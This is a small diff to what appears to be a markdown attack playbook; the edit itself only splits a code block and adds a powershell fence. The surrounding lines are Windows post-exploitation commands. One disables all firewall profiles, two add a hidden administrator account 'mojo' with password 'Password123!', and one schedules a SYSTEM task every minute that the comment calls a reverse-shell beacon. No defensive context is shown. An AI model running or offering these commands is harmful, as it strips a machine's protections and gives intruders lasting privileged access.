@@ -12,7 +12,9 @@ netsh advfirewall set allprofiles state off
 # Add an administrative user to establish persistence
 net user mojo Password123! /add
 net localgroup administrators mojo /add
+```
 
+```powershell
 # Add a beacon that pings a reverse shell every minute
 schtasks /create /sc minute /mo 1 /tn "chillin" /tr C:\ProgramData\System\chillin.bat /ru "SYSTEM"
 ```
